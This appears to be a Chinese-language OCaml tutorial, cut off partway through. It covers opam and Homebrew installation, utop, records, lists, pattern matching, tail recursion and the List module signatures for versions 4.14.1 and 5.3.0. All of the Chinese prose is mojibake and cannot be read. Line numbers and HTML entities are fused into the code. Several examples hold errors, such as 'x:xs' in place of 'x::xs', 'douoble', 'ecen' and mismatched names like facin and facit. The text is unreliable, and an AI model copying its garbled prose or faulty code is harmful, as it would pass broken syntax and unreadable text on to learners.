åˆ›å»ºæŒ‡å®šç‰ˆæœ¬çš„ OCaml ç¼–è¯‘ç¯å¢ƒï¼ˆè¿™é‡Œæ˜¯ 4.14.1ï¼‰opam switch create 4.14.1# 6. å†æ¬¡åŠ è½½ opam ç¯å¢ƒï¼ˆè¿›å…¥æ–° switchï¼‰eval $(opam env)# 7. å®‰è£…é…å¥—å·¥å…·ï¼ˆdune æ„å»ºå·¥å…·ï¼Œutop REPLï¼Œocaml-lsp-server è¯­è¨€æœåŠ¡ï¼‰opam install -y dune utop ocaml-lsp-server MacOSï¼š 123456789101112131415161718192021# 0. å®‰è£… Homebrewï¼ˆå¦‚æœå·²ç»å®‰è£…å¯ä»¥è·³è¿‡ï¼‰/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;brew update# 1. å®‰è£… OCaml å’Œ OPAMï¼ˆOCaml çš„å®˜æ–¹åŒ…ç®¡ç†å·¥å…·ï¼‰brew install ocaml opam# 2. åˆå§‹åŒ– OPAMï¼ˆç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶å¿…é¡»ï¼‰opam initeval $(opam env)# 3. åˆ›å»ºä¸€ä¸ªæ–°çš„ OCaml ç¼–è¯‘å™¨ç¯å¢ƒï¼ˆå¯æŒ‡å®šç‰ˆæœ¬ï¼‰opam switch create 4.14.1eval $(opam env)# 4. å®‰è£… utopï¼ˆæ›´å¥½çš„ OCaml REPL å·¥å…·ï¼‰opam install utopeval $(opam env)# 5. å¯åŠ¨ utop æµ‹è¯•utop å…¶ä¸­utop æ˜¯ OCaml çš„ä¸€ä¸ªå¢å¼ºå‹äº¤äº’å¼å‘½ä»¤è¡Œï¼ˆREPLï¼‰ï¼Œæä¾›è¯­æ³•é«˜äº®ã€è‡ªåŠ¨è¡¥å…¨å’Œæ›´å‹å¥½çš„å¼€å‘ä½“éªŒï¼š åœ¨utopä¸­ï¼š # è¡¨ç¤ºInterpreteråœ¨ç­‰å¾…è¾“å…¥ï¼ˆinputï¼‰ï¼› ;; ç”¨äºæ ‡å¿—ä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æŸï¼Œå‘Šè¯‰è§£é‡Šå™¨å¯ä»¥å¼€å§‹æ‰§è¡Œï¼ˆè·ŸCè¯­è¨€ä¸­çš„;ä¸€æ ·ï¼‰ï¼› - åˆ™è¡¨ç¤ºè¾“å‡ºçš„ç»“æœ å…³äºè‡ªåŠ¨è¡¥å…¨çš„éƒ¨åˆ†ï¼Œå¯ä»¥ä½¿ç”¨Alt+Leftä»¥åŠAlt+Rightæ¥é€‰æ‹©ï¼Œç„¶åä½¿ç”¨Alt+Downè¿›è¡Œç¡®è®¤ã€‚ï¼ˆè¿™é‡Œçš„Left, Right, DownæŒ‡çš„æ˜¯é”®ç›˜ä¸Šçš„æ–¹å‘é”®ã€‚ï¼‰ åœ¨åç»­å†…å®¹ä¸­æˆ‘ä»¬ä¼šutopçš„æ ¼å¼æ¥åŒºåˆ†ä»£ç ä»¥åŠç»“æœã€‚ æ›´æ–°12345678# 1.ç¡®è®¤æ˜¯é€šè¿‡ opam ç®¡ç†çš„ OCamlopam --version# 2. ç”¨ opam å®‰è£… OCaml 5.3opam updateopam upgradeopam switch create 5.3.0 ocaml-base-compiler.5.3.0 éªŒè¯ï¼š 12$ ocaml -versionThe OCaml toplevel, version 5.3.0 ç„¶åéœ€è¦é‡æ–°å®‰è£…utopï¼š 1opam install utop éªŒè¯ï¼š12utop # Sys.ocaml_version;;- : string = &quot;5.3.0&quot; BasicsHello World12# print_string &quot;Hello World!&quot;;;Hello World!- : unit = () å®šä¹‰å˜é‡ä½¿ç”¨letï¼š 12345# let seven = 3+4;;val seven : int = 7# seven;;- : int = 7 å˜é‡åçš„å¼€å¤´éœ€ä¸ºå°å†™å­—æ¯ã€‚ ä¹Ÿå¯ä»¥å®šä¹‰tupleï¼š 123let (x,y) = (3,4.0)let (_,y) = (3,4) _è¡¨ç¤ºanaonymous variableã€‚ Recordsåœ¨ OCaml ä¸­ï¼Œè®°å½•ï¼ˆrecordsï¼‰æ˜¯ä¸€ç§ é™æ€ã€å›ºå®šå­—æ®µå çš„æ•°æ®ç»“æ„ï¼Œç±»ä¼¼äº C è¯­è¨€çš„ struct æˆ– Python çš„ç±»å®ä¾‹ã€‚ å­—æ®µåå’Œç±»å‹åœ¨å®šä¹‰æ—¶å°±å›ºå®šäº†ï¼Œä¸èƒ½åŠ¨æ€æ·»åŠ æˆ–åˆ é™¤ã€‚ è·Ÿå­—å…¸ä¸ä¸€æ ·ã€‚ 12345678910type person = &#123;given:string; sur:string; age:int&#125;let paul = &#123; given=&quot;Paul&quot;; sur=&quot;Meier&quot;; age=24 &#125;let hans = &#123; sur=&quot;kohl&quot;; age=23; given=&quot;hans&quot;&#125;let hansi = &#123;age=23; sur=&quot;kohl&quot;; given=&quot;hans&quot;&#125;# hans = hansi;;- : bool = true åˆ©ç”¨componentçš„åå­—æ¥è®¿é—®ï¼Œæ¯”å¦‚è¯´ 12# paul.given;;- : string = &quot;Paul&quot; æˆ–è€…åˆ©ç”¨pattern matching 1234# let &#123;given = x;sur = y; age = z&#125; = paul;;val x : string = &quot;Paul&quot;val ny : string = &quot;Meier&quot;val z : int = 24 12# let &#123;given = x;_&#125; = paul;;val x : string = &quot;Paul&quot; Lists åˆ—è¡¨ä½¿ç”¨[]å’Œ::æ„é€ åˆ—è¡¨ï¼š 1234567891011# let mt = [];;val mt : &#x27;a list = []# let l1 = 1::mt;;val l1 : int list = [1]# let l = [1;2;3];;val l : int list = [1; 2; 3]# let l = 1::2::3::[];;val l : int list = [1; 2; 3] æ³¨æ„ï¼Œåˆ—è¡¨é‡Œçš„æ‰€æœ‰å…ƒç´ éƒ½éœ€è¦æ˜¯åŒä¸€ä¸ªtypeçš„ã€‚ æˆ‘ä»¬å¯ä»¥é’ˆå¯¹ä¸€ä¸ªåˆ—è¡¨è¿›è¡Œpattern matching: 123456# match lwith [] -&gt; -1| x::xs -&gt; x;;-: int = 1 å…¶ä¸­xæŒ‡çš„æ˜¯å½“å‰åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè€Œxsæ˜¯æ‰€æœ‰å‰©ä½™çš„å…ƒç´ ã€‚ åœ¨ OCaml é‡Œï¼Œ:: æ˜¯ åˆ—è¡¨æ‹†åˆ†ï¼ˆconsï¼‰è¿ç®—ç¬¦ï¼Œæ¨¡å¼çš„è¯­æ³•æ˜¯ï¼š 1head::tail headéƒ¨åˆ†é»˜è®¤æ˜¯åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œtailåˆ™æ˜¯å‰©ä½™ã€‚ï¼ˆè¿™é‡Œçš„å˜é‡åæ— å…³ç´§è¦ï¼Œx::xs, head::tailçš„æ•ˆæœæ˜¯å®Œå…¨ä¸€æ ·çš„ï¼‰ Case Distinction åˆ†ç±»è®¨è®ºä½¿ç”¨matchå’Œifï¼š 12345match n with | 0 -&gt; &quot;null&quot; | 1 -&gt; &quot;one&quot; | _ -&gt; &quot;uncountable!&quot; 123match e with| true -&gt; e1| false -&gt; e2 ç¬¬äºŒä¸ªä¹Ÿå¯ä»¥å†™æˆ 1if e then e1 else e2 å¯ä»¥æŠŠOcamlé‡Œçš„matchç†è§£æˆä¸€ä¸ªåˆ†æ®µå‡½æ•°ï¼Œå°†ä¸åŒçš„å®šä¹‰åŸŸä¸Šçš„å€¼æ˜ å°„åˆ°å…¶ä»–å€¼ä¸Šã€‚ ä¹Ÿå¯ä»¥æŠŠmatchç†è§£æˆif, elseï¼Œå…¶ä¸­_ä¸ºelseã€‚ å®šä¹‰ç±»å‹ï¼ˆTypeï¼‰å®šä¹‰Tupleçš„æ•°æ®ç±»å‹ï¼š 123type vector3 = float*float*float;;let p1: vector3 = (1.0,1.0,1.0);; é”™è¯¯ç¤ºä¾‹ï¼š 123type vector3 = (x1:float; x2:float; x3:float);;let p1 = vector3(1.0,1.0,1.0);; 12345678910type student = &#123; first_name : string; last_name : string; id : int; semester : int; grades : (int * float) list;&#125;type database = student list æ•°æ®ç±»å‹è½¬æ¢123string_of_floatstring_of_int... å‡½æ•°åŒæ ·ä½¿ç”¨letæ¥å®šä¹‰å‡½æ•°ï¼šï¼ˆæ‰€ä»¥åœ¨Ocamlé‡Œå¯ä»¥æŠŠå‡½æ•°ç†è§£æˆå˜é‡ï¼‰ 12345# let double x = 2 * x;;val double : int -&gt; int = &lt;fun&gt;# (double 3, douoble (double 1));;- : int * int = (6,4) ä¹Ÿå¯ä»¥å†™æˆ 12# let double = fun x -&gt; 2*x;;val double : int -&gt; int = &lt;fun&gt; ç”¨funæ¥å¼ºè°ƒä¸€ä¸‹è¿™é‡Œå®šä¹‰çš„æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ ä¸è¿‡è¦æ³¨æ„ä¸€ç‚¹ï¼Œå¦‚æœåœ¨å®šä¹‰å‡½æ•°æ—¶ç”¨åˆ°äº†ä¸€ä¸ªä¹‹å‰å®šä¹‰çš„å˜é‡ï¼Œé‚£ä¹ˆåœ¨å®šä¹‰å®Œå‡½æ•°ä¹‹åä¿®æ”¹è¿™ä¸ªå˜é‡å¹¶ä¸ä¼šä¿®æ”¹è¿™ä¸ªå‡½æ•°çš„æ“ä½œã€‚ 1234567891011# let factor = 2;;val factor : int = 2# let double x = factor * x;;val double : int -&gt; int = &lt;fun&gt;# let factor = 4;;val factor : int = 4# double 3;;- : int = 6 æ³¨æ„åˆ°è¿™é‡Œçš„ç»“æœæ˜¯6ï¼ˆ$2\\cdot3$ï¼‰è€Œä¸æ˜¯12ï¼ˆ$4\\cdot3$ï¼‰ã€‚ å‡½æ•°ç±»å‹å…ˆçœ‹è¿™ä¸ªä¾‹å­ï¼š 123type &#x27;a t = &#x27;a list = [] | (::) of &#x27;a * &#x27;a listfold_left : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;a ï¼ˆè¿™ä¸ªå‡½æ•°çš„å…·ä½“åŠŸèƒ½åé¢ä¼šè®²ã€‚ï¼‰ æ ¹æ®typeçš„å®šä¹‰ï¼Œå®ƒç­‰äºï¼š 1fold_left : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b list -&gt; &#x27;a è¿™æ ·ç†è§£ï¼š è¿™ä¸ªå‡½æ•°ä¼šæ¥æ”¶ä¸‰ä¸ªå‚æ•°ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¾“å‡ºã€‚è¾“å…¥çš„å†…å®¹çš„å…¬å¼åˆ†åˆ«ä¸ºï¼š (&#39;a -&gt; &#39;b -&gt; &#39;a)ï¼šä¸€ä¸ªå‡½æ•°ï¼Œæ¥æ”¶2ä¸ªè¾“å…¥ï¼Œè¿”å›ä¸€ä¸ªè¾“å‡ºã€‚è¾“å‡ºçš„æ•°æ®ç±»å‹ä¸è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„æ•°æ®ç±»å‹ç›¸åŒï¼› &#39;aï¼šä¸€ä¸ªä»»æ„ç±»å‹çš„æ•°æ®ï¼› &#39;b listï¼šä¸€ä¸ªä»»æ„æ•°æ®ç±»å‹çš„åˆ—è¡¨ï¼› è€Œè¾“å‡ºçš„æ•°æ®ç±»å‹ä¸º&#39;aï¼Œä¸ç¬¬äºŒä¸ªå‚æ•°ç›¸åŒã€‚ Recursive Functions é€’å½’å‡½æ•°ä½¿ç”¨recï¼š 12345678# let rec fac n = if n &lt; 2 then 1 else n * fac (n-1);;val fac : int -&gt; int = &lt;fun&gt;# let rec fib = fun x -&gt; if x &lt;=1 then 1else fib (x-1) + fib (x-2);;val fib : int -&gt; int = &lt;fun&gt; æƒ³è¦å‡ ä¸ªæ–°å®šä¹‰çš„å‡½æ•°äº¤å‰å¼•ç”¨é€’å½’çš„è¯åˆ™éœ€è¦ç”¨andè¿æ¥ï¼š 123456789# let rec even n = if n=0 then &quot;even&quot;else odd (n-1)and odd n = if n=0 then &quot;odd&quot;else ecen (n-1);;val even : int -&gt; string = &lt;fun&gt;val odd : int -&gt; string = &lt;fun&gt; ä½¿ç”¨Case Distinctionæ¥å®šä¹‰å‡½æ•°12345678# let rec length = fun l -&gt; match l with| [] -&gt; 0| x:xs -&gt; 1 + length xs;;val length : &#x27;a list -&gt; int = &lt;fun&gt;# length [1;2;3];;- : int = 3 ä¹Ÿå¯ä»¥å†™æˆ 12345678# let rec length = function| [] -&gt; 0| x:xs -&gt; 1 + length xs;;val length : &#x27;a list -&gt; int = &lt;fun&gt;# length [1;2;3];;- : int = 3 Local Definitionså¯ä»¥ä½¿ç”¨letæˆ–è€…let recå®šä¹‰ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼ˆä¸è¿‡éœ€è¦é…åˆinä¸€èµ·ä½¿ç”¨ï¼‰ï¼š 123456789101112# let x = 5 inlet sq = x*x insq + sq;;- : int = 50# let facin n = let rec iter m yet = if m &gt; n then yet else iter (m+1) (m*yet) in iter 2 1;;val facit : int -&gt; int = &lt;fun&gt; åœ¨facinçš„ä¾‹å­é‡Œï¼Œæˆ‘ä»¬ç›¸å½“äºåœ¨å®šä¹‰facinè¿™ä¸ªå‡½æ•°æ—¶å®šä¹‰å¹¶è°ƒç”¨äº†ä¸€ä¸ªæ–°å‡½æ•°ï¼ˆiterï¼‰ã€‚ Tail Recursive å°¾é€’å½’æˆ‘ä»¬æ‹¿é˜¶ä¹˜æ¥ä¸¾ä¾‹å­ï¼Œæ­£å¸¸çš„æ˜¯è¿™ä¹ˆå†™é€’å½’ï¼š 123let rec fac n =if n &lt;= 1 then 1else n * fac (n-1);; è¿™æ ·å­çš„è®¡ç®—é€»è¾‘ä¾¿æ˜¯ï¼š 1234fac 5= 5 * fac 4= 5 * (4 * fac 3)= ... æ¯æ¬¡éƒ½éœ€è¦é€’å½’ä¸‹å»ç›´åˆ°å¾—åˆ°fac 1çš„ç»“æœäº†ä¹‹åå†ä¸€å±‚ä¸€å±‚åœ°ä¹˜å›æ¥ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ‰€éœ€çš„æ ˆç©ºé—´éå¸¸å¤§ã€‚ è€Œå°¾é€’å½’çš„å†™æ³•åˆ™æ˜¯ï¼š 123456let fac x = let rec facit n acc = if n &lt;= 1 then acc else facit (n - 1) (n * acc) in facit x 1 è¿™æ ·çš„æµç¨‹åˆ™å˜æˆäº†ï¼š 1facit 5 1 â†’ facit 4 5 â†’ facit 3 20 â†’ facit 2 60 â†’ facit 1 120 â†’ è¿”å› 120 ç›¸å½“äºæ˜¯ä¸€æ¡è·¯èµ°ä¸‹å»ã€‚ ç”¨æ±‡ç¼–çš„è§’åº¦æ¥ç†è§£å°±æ˜¯ï¼Œæ™®é€šçš„æƒ…å†µéœ€è¦ä¸€ç›´callï¼Œä½†æ˜¯å°¾é€’å½’çš„å†™æ³•å°±åªéœ€è¦jumpäº†ã€‚ å†æ¥å¤šçœ‹äº›ä¾‹å­ï¼š åˆ—è¡¨é•¿åº¦æ™®é€šé€’å½’ï¼š 12345let rec length lst = match lst with | [] -&gt; 0 | _ :: t -&gt; 1 + length t å°¾é€’å½’ï¼š 1234567let length lst = let rec aux lst len = match lst with [] -&gt; len |_::t -&gt; aux t (len+1) in aux lst 0;; åˆ—è¡¨åè½¬æ™®é€šé€’å½’ï¼š 1234let rec rev lst = match lst with | [] -&gt; [] | h :: t -&gt; (rev t) @ [h] å°¾é€’å½’ï¼š 1234567let rev lst = let rec aux lst l = match lst with [] -&gt; l |x::xs -&gt; aux xs (x::l) in aux lst [];; åˆ—è¡¨æ˜ å°„æ™®é€šé€’å½’ï¼š 1234let rec map f lst = match lst with | [] -&gt; [] | h :: t -&gt; (f h) :: (map f t) å°¾é€’å½’ï¼š 1234567let map f lst = let rec aux f lst l = match lst with []-&gt; List.rev l |x::xs -&gt; aux f xs ((f x)::l) in aux f lst [];; è®¡ç®—æ ‘çš„å’Œæ ‘çš„Typeå®šä¹‰ 1type tree = | Leaf of int | Node of int * tree * tree æ™®é€šé€’å½’ï¼š 123let rec sum_tree t = match t with | Leaf n -&gt; n | Node(n, left, right) -&gt; n + sum_tree left + sum_tree right å°¾é€’å½’ï¼š 12345678let sum_tree t =let rec aux s l =match l with[] -&gt; s|Leaf n :: xs -&gt; aux (s+n) xs|Node(n,left,right)::xs -&gt; aux (s+n) (left::right::xs)inaux 0 [t];; æ ¸å¿ƒæ€è·¯ï¼šå°†leftå’Œright treeå…¨éƒ½æ·»åŠ è¿›ä¸€ä¸ªåˆ—è¡¨é‡Œï¼Œç­‰åç»­æ…¢æ…¢å¤„ç†ã€‚ æ€»ç»“ä¸€ä¸‹å¦‚ä½•å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå‡½æ•°æ˜¯å¦æ˜¯å°¾é€’å½’çš„ï¼š å¦‚æœåœ¨è°ƒç”¨å®ƒæ—¶ï¼Œéœ€è¦åˆ©ç”¨å…¶ç»“æœå†è¿›è¡Œä»»ä½•è®¡ç®—ï¼Œé‚£éƒ½å±äºéå°¾é€’å½’ï¼Œæ¯”å¦‚è¯´ 123n * fac (n-1)n + sum_tree left + sum_tree right è€Œå¦‚æœè°ƒç”¨æ—¶å¹²å‡€åˆ©è½ï¼Œå‰åæ²¡æœ‰è·Ÿä»»ä½•å¤šä½™çš„ä¸œè¥¿ï¼Œåˆ™å±äºå°¾é€’å½’ï¼Œæ¯”å¦‚è¯´ï¼š 123facit (n - 1) (n * acc)aux (s+n) (left::right::xs) Listå‡½æ•°å…ˆçœ‹ä¸€ä¸‹å…¨éƒ¨çš„ç­¾åï¼ˆ4.14.1ç‰ˆæœ¬ä¸‹çš„ï¼‰ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# #show List;;module List : sig type &#x27;a t = &#x27;a list = [] | (::) of &#x27;a * &#x27;a list val length : &#x27;a t -&gt; int val compare_lengths : &#x27;a t -&gt; &#x27;b t -&gt; int val compare_length_with : &#x27;a t -&gt; int -&gt; int val cons : &#x27;a -&gt; &#x27;a t -&gt; &#x27;a t val hd : &#x27;a t -&gt; &#x27;a val tl : &#x27;a t -&gt; &#x27;a t val nth : &#x27;a t -&gt; int -&gt; &#x27;a val nth_opt : &#x27;a t -&gt; int -&gt; &#x27;a option val rev : &#x27;a t -&gt; &#x27;a t val init : int -&gt; (int -&gt; &#x27;a) -&gt; &#x27;a t val append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val rev_append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val concat : &#x27;a t t -&gt; &#x27;a t val flatten : &#x27;a t t -&gt; &#x27;a t val equal : (&#x27;a -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; bool val compare : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; int val iter : (&#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val iteri : (int -&gt; &#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val mapi : (int -&gt; &#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val rev_map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val filter_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b t val concat_map : (&#x27;a -&gt; &#x27;b t) -&gt; &#x27;a t -&gt; &#x27;b t val fold_left_map : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a * &#x27;c) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;a * &#x27;c t val fold_left : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;a val fold_right : (&#x27;a -&gt; &#x27;b -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b -&gt; &#x27;b val iter2 : (&#x27;a -&gt; &#x27;b -&gt; unit) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; unit val map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val rev_map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val fold_left2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;c t -&gt; &#x27;a val fold_right2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c -&gt; &#x27;c val for_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val exists : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val for_all2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val exists2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val mem : &#x27;a -&gt; &#x27;a t -&gt; bool val memq : &#x27;a -&gt; &#x27;a t -&gt; bool val find : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a val find_opt : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a option val find_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b option val filter : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val find_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val filteri : (int -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val partition : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t * &#x27;a t val partition_map : (&#x27;a -&gt; (&#x27;b, &#x27;c) Either.t) -&gt; &#x27;a t -&gt; &#x27;b t * &#x27;c t val assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assoc_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assq_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val mem_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val mem_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val remove_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val remove_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val split : (&#x27;a * &#x27;b) t -&gt; &#x27;a t * &#x27;b t val combine : &#x27;a t -&gt; &#x27;b t -&gt; (&#x27;a * &#x27;b) t val sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val stable_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val fast_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val sort_uniq : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val merge : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val to_seq : &#x27;a t -&gt; &#x27;a Seq.t val of_seq : &#x27;a Seq.t -&gt; &#x27;a t end 5.3.0ç‰ˆæœ¬ä¸‹çš„å…¨éƒ¨çš„ç­¾åï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576utop # #show List;;module List : sig type &#x27;a t = &#x27;a list = [] | (::) of &#x27;a * &#x27;a list val length : &#x27;a t -&gt; int val compare_lengths : &#x27;a t -&gt; &#x27;b t -&gt; int val compare_length_with : &#x27;a t -&gt; int -&gt; int val is_empty : &#x27;a t -&gt; bool val cons : &#x27;a -&gt; &#x27;a t -&gt; &#x27;a t val hd : &#x27;a t -&gt; &#x27;a val tl : &#x27;a t -&gt; &#x27;a t val nth : &#x27;a t -&gt; int -&gt; &#x27;a val nth_opt : &#x27;a t -&gt; int -&gt; &#x27;a option val rev : &#x27;a t -&gt; &#x27;a t val init : int -&gt; (int -&gt; &#x27;a) -&gt; &#x27;a t val append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val rev_append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val concat : &#x27;a t t -&gt; &#x27;a t val flatten : &#x27;a t t -&gt; &#x27;a t val equal : (&#x27;a -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; bool val compare : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; int val iter : (&#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val iteri : (int -&gt; &#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val mapi : (int -&gt; &#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val rev_map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val filter_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b t val concat_map : (&#x27;a -&gt; &#x27;b t) -&gt; &#x27;a t -&gt; &#x27;b t val fold_left_map : (&#x27;acc -&gt; &#x27;a -&gt; &#x27;acc * &#x27;b) -&gt; &#x27;acc -&gt; &#x27;a t -&gt; &#x27;acc * &#x27;b t val fold_left : (&#x27;acc -&gt; &#x27;a -&gt; &#x27;acc) -&gt; &#x27;acc -&gt; &#x27;a t -&gt; &#x27;acc val fold_right : (&#x27;a -&gt; &#x27;acc -&gt; &#x27;acc) -&gt; &#x27;a t -&gt; &#x27;acc -&gt; &#x27;acc val iter2 : (&#x27;a -&gt; &#x27;b -&gt; unit) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; unit val map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val rev_map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val fold_left2 : (&#x27;acc -&gt; &#x27;a -&gt; &#x27;b -&gt; &#x27;acc) -&gt; &#x27;acc -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;acc val fold_right2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;acc -&gt; &#x27;acc) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;acc -&gt; &#x27;acc val for_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val exists : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val for_all2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val exists2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val mem : &#x27;a -&gt; &#x27;a t -&gt; bool val memq : &#x27;a -&gt; &#x27;a t -&gt; bool val find : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a val find_opt : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a option val find_index : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; int option val find_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b option val find_mapi : (int -&gt; &#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b option val filter : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val find_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val filteri : (int -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val take : int -&gt; &#x27;a t -&gt; &#x27;a t val drop : int -&gt; &#x27;a t -&gt; &#x27;a t val take_while : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val drop_while : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val partition : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t * &#x27;a t val partition_map : (&#x27;a -&gt; (&#x27;b, &#x27;c) Either.t) -&gt; &#x27;a t -&gt; &#x27;b t * &#x27;c t val assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assoc_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assq_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val mem_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val mem_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val remove_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val remove_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val split : (&#x27;a * &#x27;b) t -&gt; &#x27;a t * &#x27;b t val combine : &#x27;a t 